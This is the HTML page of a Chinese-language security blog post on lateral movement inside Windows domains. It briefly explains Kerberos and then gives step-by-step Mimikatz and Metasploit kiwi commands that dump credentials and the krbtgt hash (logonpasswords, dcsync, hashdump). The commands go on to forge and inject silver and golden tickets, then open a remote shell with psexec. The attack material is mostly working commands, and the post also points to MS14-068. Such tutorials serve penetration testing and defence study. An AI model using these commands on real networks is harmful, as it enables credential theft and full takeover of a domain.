@@ -1,0 +1,387 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>域内横向（三） | Zoukba&#39;s gun</title>
+  <meta name="author" content="zoukba">
+  
+  <meta name="description" content="内网横向（三）票据传递攻击（ptt）Kerberos协议什么是KerberosKerberos是一种计算机网络认证协议，它允许某实体在非安全网络环境下通信，向另一个实体以一种安全的方式证明自己的身份。它也指由麻省理工实现此协议，并发布的一套免费软件。它的设计主要针对客户-服务器模型，并提供了一系列交互认证——用户和服务器都能验证对方的身份。
+主要参数1234567AS（Authentication Server）			#认证服务器KDC（Key Distribution Center）		#密钥分发中心TGT（Ticket Granting Ticket）			#票据授权票据，票据的票据（黄金票据）TGS（Ticket Granting Server）			#票据授权服务器（白银票据）SS（Service Server）					#特定服务提供端AS和TGS组成了KDC
+简单描述
+user想as做请求想要获取票据并自己生成key(使用账户和密码)，然后as就会在服务器库中寻找user的密码，并作出user的key。然后就会返回两条信息：一条是包含TGS的会话密钥使用用户的key加密，用户可以使用自己的key解出密钥；第二条是TGT使用TGS自我的密钥加密，用户无法使用自己密钥解出。（在这个事件中，我们就可以窥探出白银票据及黄金票据）
+详细链接
+
+pth与ptt"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="域内横向（三）"/>
+  <meta property="og:site_name" content="Zoukba&#39;s gun"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/[object Object]" title="Zoukba&#39;s gun" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Zoukba&#39;s gun</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 域内横向（三）</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="内网横向（三）"><a href="#内网横向（三）" class="headerlink" title="内网横向（三）"></a>内网横向（三）</h1><h2 id="票据传递攻击（ptt）"><a href="#票据传递攻击（ptt）" class="headerlink" title="票据传递攻击（ptt）"></a>票据传递攻击（ptt）</h2><h3 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h3><h4 id="什么是Kerberos"><a href="#什么是Kerberos" class="headerlink" title="什么是Kerberos"></a>什么是Kerberos</h4><p>Kerberos是一种计算机网络认证协议，它允许某实体在非安全网络环境下通信，向另一个实体以一种安全的方式证明自己的身份。它也指由麻省理工实现此协议，并发布的一套免费软件。它的设计主要针对客户-服务器模型，并提供了一系列交互认证——用户和服务器都能验证对方的身份。</p>
+<h4 id="主要参数"><a href="#主要参数" class="headerlink" title="主要参数"></a>主要参数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AS（Authentication Server）			<span class="comment">#认证服务器</span></span><br><span class="line">KDC（Key Distribution Center）		<span class="comment">#密钥分发中心</span></span><br><span class="line">TGT（Ticket Granting Ticket）			<span class="comment">#票据授权票据，票据的票据（黄金票据）</span></span><br><span class="line">TGS（Ticket Granting Server）			<span class="comment">#票据授权服务器（白银票据）</span></span><br><span class="line">SS（Service Server）					<span class="comment">#特定服务提供端</span></span><br><span class="line"></span><br><span class="line">AS和TGS组成了KDC</span><br></pre></td></tr></table></figure>
+<h4 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h4><ul>
+<li>user想as做请求想要获取票据并自己生成key(使用账户和密码)，然后as就会在服务器库中寻找user的密码，并作出user的key。然后就会返回两条信息：一条是包含TGS的会话密钥使用用户的key加密，用户可以使用自己的key解出密钥；第二条是TGT使用TGS自我的密钥加密，用户无法使用自己密钥解出。（在这个事件中，我们就可以窥探出白银票据及黄金票据）</li>
+<li><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Kerberos">详细链接</a></li>
+</ul>
+<h4 id="pth与ptt"><a href="#pth与ptt" class="headerlink" title="pth与ptt"></a>pth与ptt</h4><p>pth的要点在于能否拿取高权限，因高权限可获取其一下的账户hash；而ptt在于你的机子登录过多少账号</p>
+<h3 id="白银票据实战"><a href="#白银票据实战" class="headerlink" title="白银票据实战"></a>白银票据实战</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul>
+<li>无需向KDC发送请求</li>
+<li>需要目标Service的NTLM-Hash</li>
+</ul>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>domain</li>
+<li>域SID</li>
+<li>目标服务器的FQDN（目标机器与域的全称：机器名.域）</li>
+<li>可利用的服务名</li>
+<li>目标Service的NTLM-Hash</li>
+<li>需要伪造的用户名</li>
+</ul>
+<h4 id="可伪造的服务器列表"><a href="#可伪造的服务器列表" class="headerlink" title="可伪造的服务器列表"></a>可伪造的服务器列表</h4><p>![[Pasted image 20210422163021.png]]</p>
+<h4 id="Mimikatz伪造"><a href="#Mimikatz伪造" class="headerlink" title="Mimikatz伪造"></a>Mimikatz伪造</h4><ul>
+<li>获取信息</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span>	<span class="comment">#ntlm-hash 域...</span></span><br><span class="line">whoami /user</span><br></pre></td></tr></table></figure>
+<ul>
+<li>sid(将下图最后四位舍去)</li>
+</ul>
+<p>![[Pasted image 20210422164202.png]]</p>
+<ul>
+<li>清除内存中的票据</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge			<span class="comment">#清除本地票据</span></span><br><span class="line">kerberos::list 			<span class="comment">#查看本地票据</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用mimikatz进行伪造</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器的FQDN&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLMHash&gt; /user:&lt;伪造的用户名&gt; /ptt&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>尝试列出</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\机器名称\C$</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用工具弹个shell</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\&lt;目标服务器全名&gt; cmd.exe</span><br></pre></td></tr></table></figure>
+<h3 id="黄金票据实战"><a href="#黄金票据实战" class="headerlink" title="黄金票据实战"></a>黄金票据实战</h3><h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><ul>
+<li>需要与DC进行tongxin</li>
+<li>需要krbtgt用户的Hash(KDC Hash)</li>
+<li>需要有高权限</li>
+</ul>
+<h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>domain</li>
+<li>域sid</li>
+<li>krbtgt用户的NTLM-Hash</li>
+<li>需要伪造的用户名</li>
+</ul>
+<h4 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h4><ul>
+<li>mimikatz<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /user:krbtgt</span><br><span class="line"></span><br><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /inject /name:krbtgt</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li>msf</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>
+<ul>
+<li>msf:kiwi</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure>
+<h4 id="mimikatz进行伪造-伪造前要注意清除"><a href="#mimikatz进行伪造-伪造前要注意清除" class="headerlink" title="mimikatz进行伪造(伪造前要注意清除)"></a>mimikatz进行伪造(伪造前要注意清除)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<h4 id="MSF中的kiwi"><a href="#MSF中的kiwi" class="headerlink" title="MSF中的kiwi"></a>MSF中的kiwi</h4><ul>
+<li>伪造</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d &lt;域名&gt; -u &lt;任意用户名&gt; -s &lt;Domain SID&gt; -k &lt;krbtgt NTLM Hash&gt; -t &lt;ticket本地存储路径如:/tmp/krbtgt.ticket&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>注入内存</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use /tmp/krbtgt.ticket</span><br></pre></td></tr></table></figure>
+<h4 id="之后可用工具回弹Psexec…"><a href="#之后可用工具回弹Psexec…" class="headerlink" title="之后可用工具回弹Psexec…."></a>之后可用工具回弹Psexec….</h4><h4 id="可利用各种CVE进行，ms14068……"><a href="#可利用各种CVE进行，ms14068……" class="headerlink" title="可利用各种CVE进行，ms14068…….."></a>可利用各种CVE进行，ms14068……..</h4>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/04/22/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/" class="leancloud-visitors view" data-flag-title="域内横向（三）">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/04/20/内网横向（二）/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-04-22 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/内网杂七杂八/">内网杂七杂八<span>7</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/域内横向/">域内横向<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89"><span class="toc-article-text">内网横向（三）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%88ptt%EF%BC%89"><span class="toc-article-text">票据传递攻击（ptt）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Kerberos%E5%8D%8F%E8%AE%AE"><span class="toc-article-text">Kerberos协议</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFKerberos"><span class="toc-article-text">什么是Kerberos</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%B8%BB%E8%A6%81%E5%8F%82%E6%95%B0"><span class="toc-article-text">主要参数</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0"><span class="toc-article-text">简单描述</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#pth%E4%B8%8Eptt"><span class="toc-article-text">pth与ptt</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%AE%9E%E6%88%98"><span class="toc-article-text">白银票据实战</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%89%B9%E7%82%B9"><span class="toc-article-text">特点</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-article-text">利用条件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8F%AF%E4%BC%AA%E9%80%A0%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%97%E8%A1%A8"><span class="toc-article-text">可伪造的服务器列表</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Mimikatz%E4%BC%AA%E9%80%A0"><span class="toc-article-text">Mimikatz伪造</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E6%88%98"><span class="toc-article-text">黄金票据实战</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%89%B9%E7%82%B9-1"><span class="toc-article-text">特点</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-article-text">利用条件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%AF%BB%E5%8F%96"><span class="toc-article-text">读取</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#mimikatz%E8%BF%9B%E8%A1%8C%E4%BC%AA%E9%80%A0-%E4%BC%AA%E9%80%A0%E5%89%8D%E8%A6%81%E6%B3%A8%E6%84%8F%E6%B8%85%E9%99%A4"><span class="toc-article-text">mimikatz进行伪造(伪造前要注意清除)</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#MSF%E4%B8%AD%E7%9A%84kiwi"><span class="toc-article-text">MSF中的kiwi</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%B9%8B%E5%90%8E%E5%8F%AF%E7%94%A8%E5%B7%A5%E5%85%B7%E5%9B%9E%E5%BC%B9Psexec%E2%80%A6"><span class="toc-article-text">之后可用工具回弹Psexec….</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E5%90%84%E7%A7%8DCVE%E8%BF%9B%E8%A1%8C%EF%BC%8Cms14068%E2%80%A6%E2%80%A6"><span class="toc-article-text">可利用各种CVE进行，ms14068……..</span></a></li></ol></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 zoukba's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
